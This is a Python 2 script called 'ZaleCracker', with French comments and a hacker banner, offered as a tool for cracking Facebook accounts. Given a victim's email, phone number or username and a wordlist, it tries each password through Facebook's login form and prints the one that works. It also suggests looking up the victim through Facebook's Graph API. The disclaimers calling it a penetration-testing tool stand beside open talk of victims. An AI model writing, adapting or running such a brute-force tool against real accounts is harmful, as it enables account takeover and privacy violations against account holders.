#!usr/bin/python
#ZaleCracker contourne les parefeux 100% efficace
#Pirater un compte facebook est illegal
#ZaleHack n'est pas responsable de vos actes


import sys
import random
import mechanize
import cookielib

GHT = '''
                                              +=======================================+ 
                                              |...............Zale Cracker............| 
                                              +---------------------------------------+ 
                                              |Auteur: Zale Hack                      | 
                                              |Facebook: www.facebook.com/Zale.Hacker | 
                                              |Date: 15/07/2014                       | 
                                              |Un outils pour test de penetration.    |                                                        
                                              |Je ne suis pas responsable de vos actes| 
                                              |                                       |  
                                              +=======================================+ 
                                              |...............Zale Hack...............| 
                                              +---------------------------------------+ 
'''
	
print		                                                      "                                     .::!!!!!!!:.     #ZaleHack"
print		                                                      "  .!!!!!:.                        .:!!!!!!!!!!!!      #www.facebook.com/ZaleHacker"
print		                                                      "  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$      #We Do What We Want Because We Can"
print		                                                      "      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P "
print		                                                      "      $$$$$##WX!:      .<!!!!UW$$$$   $$$$$$$$# "
print		                                                      "      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* "    
print		                                                      "      ^$$$B  $$$$      $$$$$$$$$$$$   d$$R* "
print		                                                      "        **$bd$$$$      '*$$$$$$$$$$$o+#  "
print		                                                      "             ****          ******* "          

print "Note : Ce outils peut cracker un facebook si vous avez l'email de la victime"
print "# CTRL+C pour quitter le programme"
print "# Utiliser www.graph.facebook.com pour avoir plus d'informations sur la victime ^_^"


email = str(raw_input("# Entrer |Email| |Numero Telephone| |ID | |Nom d'utilisateur| : "))
passwordlist = str(raw_input("Entrer le repertoire du dictionnaire : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log != login:
        print "\n\n\n [*] le mot de passe est trouve .. !!"
        print "\n [*] Mot de passe : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Compte a cracker : %s" % (email)
        print " [*] Chargement :" , len(passwords), "passwords"
        print " [*] Cracking, patientez ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()
